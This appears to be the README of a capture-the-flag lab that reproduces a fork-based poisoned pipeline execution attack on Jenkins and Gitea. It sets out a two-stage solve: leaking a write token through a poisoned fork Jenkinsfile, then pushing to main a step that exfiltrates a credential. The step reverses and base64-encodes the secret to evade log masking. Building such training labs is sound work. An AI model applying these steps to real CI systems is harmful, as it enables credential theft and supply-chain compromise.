# Caterpillar: public fork-based poisoned pipeline execution (CyberCTF lab)

A bespoke, self-contained reproduction of the **Caterpillar** challenge from
[CI/CD Goat](https://github.com/cider-security-research/cicd-goat) — OWASP **CICD-SEC-4, Poisoned
Pipeline Execution**, in its **public / fork-based (3PE)** form. Wonderland runs CI on a **Jenkins**
controller that builds the **public** `Wonderland/caterpillar` repository (hosted on a **Gitea**
server). A *test* pipeline builds pull requests — **including pull requests opened from forks** — and
a write-scoped Gitea token (`gitea_token`) is exposed to every build on the controller. An attacker
who holds only a plain account forks the repository, poisons the `Jenkinsfile` to dump the build
environment and opens a pull request; the test pipeline runs the untrusted fork code and leaks the
write token. With that token the attacker escalates — re-clones the repository with write access and
poisons `main`, where the *prod* pipeline binds and exfiltrates the per-player `flag2` credential.

**Private lab content — do not copy into any public repository.**

## Infrastructure

Two machines, the minimum a live fork-based pipeline attack needs:

| Machine | What |
|---|---|
| `jenkins` | Jenkins controller, configured by Configuration-as-Code. A Job DSL seed creates two multibranch pipelines, each in its own folder. `caterpillar-pr/wonderland-caterpillar-test` discovers pull-request head refs (`refs/pull/*/head`, which Gitea publishes for fork PRs) and builds untrusted fork code; the write-scoped `gitea_token` is a controller-wide environment variable exposed to it. `caterpillar-release/wonderland-caterpillar-prod` builds `main`; `flag2` is a credential scoped to **its folder only**, loaded at boot by an init-groovy hook, so the test pipeline cannot bind it. `git` + `curl` are present for the in-machine solver. |
| `gitea` | Gitea git host. The setup job provisions the `Wonderland` org, the **public** `caterpillar` repo, the plain attacker `cheshire` (no write access — fork + PR only), the write CI robot `hatter` (whose push credential is the leaked token), and the poller `jenkins` (read), then pushes the sample project and its `Jenkinsfile`. |

No GitLab, CTFd, prod box or SSH agents — only what this one vulnerability needs. The web ports
listen on container `8080` (Jenkins) and `3000` (Gitea); the host ports are assigned dynamically by
the runner (see below). Jenkins is slow to boot and the attack needs two scans and two builds — allow
several minutes.

## Objective

One per-player objective (`.ctf/objectives.json`), graded by CyberBackend:

| Key | Evidence | What the player recovers |
|---|---|---|
| `caterpillar` | `SECRET` (`%s`) | Wonderland's `flag2` release credential, exfiltrated from the Jenkins credential store via a two-stage public fork-based PPE |

Intended path:

1. **Public fork PPE.** Fork the public `Wonderland/caterpillar`, change the `Jenkinsfile` in the fork
   to `sh 'env'`, and open a pull request into `main`. The `wonderland-caterpillar-test` pipeline
   builds the fork's code and prints its environment, leaking the write-scoped `gitea_token`.
2. **Escalate.** Re-clone the original repository with the token
   (`git clone http://$gitea_token@<gitea>/Wonderland/caterpillar.git`), add a
   `withCredentials([string(credentialsId: 'flag2', variable: 'flag2')]) { sh 'echo $flag2 | rev | base64' }`
   step to the `Jenkinsfile` and push to `main`. The `wonderland-caterpillar-prod` pipeline (the only
   one that can bind `flag2`) runs it and prints the exfiltrated blob; `base64 -d | rev` is the flag.
   (Modern Jenkins masks the raw value *and* its plain base64; reversing first evades the masker — see
   UPSTREAM.md.)

The second stage is impossible without the first: `flag2` is folder-scoped to the prod pipeline, so
the untrusted test (fork-PR) build cannot read it — the attacker must steal the write token and reach
`main`. That two-stage escalation is what distinguishes **public** PPE (this lab) from direct PPE.

## Per-player flag

The flag is issued per player by CyberCTF and handed to the lab by the launcher as a **file**
(`isoloom.yml` `inputs: [CTF_FLAG_CATERPILLAR]`, delivered via
`files: [{ path: /run/lab/secrets/flag2, input: CTF_FLAG_CATERPILLAR }]` on the Jenkins machine),
never an environment variable, so it never appears in `docker inspect`, an image layer or a generated
file. The Jenkins entrypoint stages the file into a root-only directory, and an init-groovy hook loads
it into the `flag2` credential **scoped to the `caterpillar-release` folder** — a pipeline must bind
the credential to read it, and only the prod pipeline's folder can, exactly as in the challenge.

An **offline start** (local, CI) leaves the input empty, and the lab loads its development placeholder
(`.ctf/objectives.json` `dev`) instead, so it still comes up and is solvable without a launcher.

## Dynamic ports

Both web services declare `ports: { web: { port: <n>, protocol: http, publish: true } }`.
`publish: true` asks the runner for a **free host port it picks at `up` time** — there is no fixed
host port anywhere in the spec, message, configs or checks (the only literals are in-container
loopback and the lab network CIDR). The `message` reads the real URLs back through
`{{ machines.jenkins.ports.web.url }}` and `{{ machines.gitea.ports.web.url }}`.

## Run it

Described once in [`isoloom.yml`](isoloom.yml) ([Isoloom](https://www.isoloom.com)); run on Docker
through the [Isothrum](https://www.isothrum.com) runner:

```bash
isoloom validate .
isoloom generate . --target docker
isothrum up . --target docker          # add --secret-from-env CTF_FLAG_CATERPILLAR for a real value
isothrum check . --target docker       # Jenkins is slow; the solver runs the full two-stage attack
isothrum down . --target docker
```

Solve it the way the check does:

```bash
# Stage 1 — public fork PPE
#   fork Wonderland/caterpillar in Gitea as cheshire, edit the fork's Jenkinsfile to `sh 'env'`,
#   open a PR into main, then read gitea_token from the wonderland-caterpillar-test build console.
# Stage 2 — escalate
git clone http://$gitea_token@<gitea-url>/Wonderland/caterpillar.git
cd caterpillar
# edit Jenkinsfile: withCredentials([string(credentialsId:'flag2',variable:'flag2')]){ sh 'echo $flag2 | rev | base64' }
git commit -am deploy && git push origin main
# read the wonderland-caterpillar-prod build console: `base64 -d <blob> | rev` is the flag
```

## Layout

- `build/jenkins/Dockerfile` — Jenkins LTS + plugins, runs as root to read the mounted secret
- `build/jenkins/casc/jenkins.yaml` — Configuration-as-Code: the controller-wide `gitea_token` env var, security, the read-only poller credential, the Job DSL seed
- `build/jenkins/casc/jobdsl/caterpillar.groovy` — the two multibranch pipelines (test: PR-ref discovery; prod: branch discovery), each in its own folder, 1-minute rescan
- `build/jenkins/init.groovy.d/10-flag2-folder-credential.groovy` — loads the per-player flag into the `flag2` credential, scoped to the prod folder
- `build/jenkins/entrypoint.sh` — stages the per-player flag into the root-only secrets directory
- `build/jenkins/solve.sh` — the solver / self-check (`/usr/local/bin/cat-solve`): performs the full two-stage 3PE and proves the flag was exfiltrated, never printing it
- `build/gitea/Dockerfile`, `app.ini`, `entrypoint.sh` — the installed Gitea host
- `build/gitea/seed.sh` — the `setup` step: provisions the org/users/public repo and pushes the sample project
- `build/gitea/repo-src/` — the original `caterpillar` package and its `Jenkinsfile`
- `.ctf/` — `metadata.json` and `objectives.json` (the catalogue registration)
- `UPSTREAM.md` — attribution, and the faithful deviations (the trigger, the token form, the masking)
- `.isoloom/` — generated by `isoloom generate` (git-ignored; don't edit)
